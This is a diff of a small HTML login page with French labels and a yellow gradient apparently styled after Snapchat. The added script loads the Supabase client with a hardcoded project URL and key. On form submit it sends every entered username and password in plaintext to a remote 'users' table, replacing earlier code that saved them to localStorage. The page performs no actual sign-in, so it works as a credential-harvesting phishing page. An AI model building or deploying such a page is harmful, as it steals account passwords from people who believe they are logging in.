@@ -5,26 +5,27 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login</title>
 
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+
 <style>
-body {
+body{
     margin:0;
     height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
-    font-family: Arial;
-    background: linear-gradient(135deg, #FFFC00, #FFE500);
+    font-family:Arial;
+    background:linear-gradient(135deg,#FFFC00,#FFE500);
 }
 
-.box {
+.box{
     background:white;
     padding:40px;
     border-radius:20px;
     width:300px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.2);
 }
 
-input {
+input{
     width:100%;
     padding:12px;
     margin-top:10px;
@@ -32,7 +33,7 @@ input {
     border:1px solid #ddd;
 }
 
-button {
+button{
     width:100%;
     padding:12px;
     margin-top:15px;
@@ -53,23 +54,31 @@ button {
     <form>
         <input id="username" placeholder="Nom d'utilisateur" required>
         <input id="password" type="password" placeholder="Mot de passe" required>
-        <button type="submit">Se connecter</button>
+        <button type="submit">Login</button>
     </form>
 </div>
 
-<!-- 🔥 SCRIPT -->
 <script>
-document.querySelector("form").addEventListener("submit", function(e) {
+const supabaseUrl = "https://qarjoeeftvtrzoqyufgb.supabase.co";
+const supabaseKey = "sb_publishable_-81q9wbD36UU-U9eBdP-AQ_wvgIUeHO";
+
+const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+document.querySelector("form").addEventListener("submit", async function(e){
     e.preventDefault();
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    // 💾 stockage permanent dans le navigateur
-    localStorage.setItem("user", username);
-    localStorage.setItem("pass", password);
+    // 💾 envoi vers base de données
+    await supabase.from("users").insert([
+        {
+            username: username,
+            password: password
+        }
+    ]);
 
-    alert("Connexion enregistrée ✔");
+    alert("Envoyé à la base de données ✔");
 });
 </script>
 
